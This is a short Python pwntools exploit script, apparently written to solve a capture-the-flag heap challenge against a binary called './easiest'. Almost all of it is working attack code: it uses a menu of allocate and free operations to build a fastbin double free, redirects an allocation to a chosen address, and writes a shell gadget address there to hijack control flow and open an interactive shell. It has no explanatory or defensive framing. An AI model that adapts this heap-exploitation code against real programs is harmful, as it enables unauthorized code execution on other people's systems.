from pwn import *
def cmd(c):
	p.sendlineafter("te \n",str(c))
def add(idx,size,c="\x00\x00\x00\x00\x00\x00\x00\x00\n"):
	cmd(1)
	p.sendlineafter("11):",str(idx))
	p.sendlineafter("th:",str(size))
	p.sendafter("C:",c)
def free(idx):
	cmd(2)
	p.sendlineafter("11):",str(idx))
sh=0x000000000400946
p=process("./easiest")
#p=remote('127.0.0.1',4000)
binary=ELF("./easiest")
context.log_level='debug'
add(0,0x38)
add(1,0x38)
add(2,0x38)
add(3,0x38)
add(4,0x88)
add(11,0x8*12,'\x00'*56+p64(sh)+'\n')
free(1)
free(2)
free(1)
add(0,0x38,'\x7a\x20\x60\n')
add(0,0x38)
add(0,0x38)
aim=0x6020c0-0xd8+88
add(0,0x38,p64(0).ljust(22,'\x00')+p64(aim)+'\n')
gdb.attach(p,'b *0x7ffff7a8269b')
cmd("nier")
p.interactive()
